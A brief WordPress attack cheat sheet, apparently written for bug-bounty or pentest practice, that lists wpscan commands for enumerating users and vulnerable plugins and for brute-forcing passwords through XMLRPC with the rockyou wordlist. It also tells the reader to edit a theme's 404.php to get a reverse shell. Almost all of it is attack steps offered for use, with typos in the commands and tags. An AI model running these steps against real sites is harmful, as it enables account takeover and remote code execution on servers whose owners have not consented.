If you found a useranme via 
```bash
wpscan -u <url> -e vp,u
```

Then you can do bruteforce attack against XMLRPC.xml file present in wordpress 

```bash
wpscan -u <url> --usernames <uname> --passswords /usr/share/wordlist/rockyou.txt --max-threads 64
```

For reverse shells edit 404.php 
`Location: /wp-content/themes/twentyfifteen/404.php`

#huntr #intrigity #hackerone #bugbounty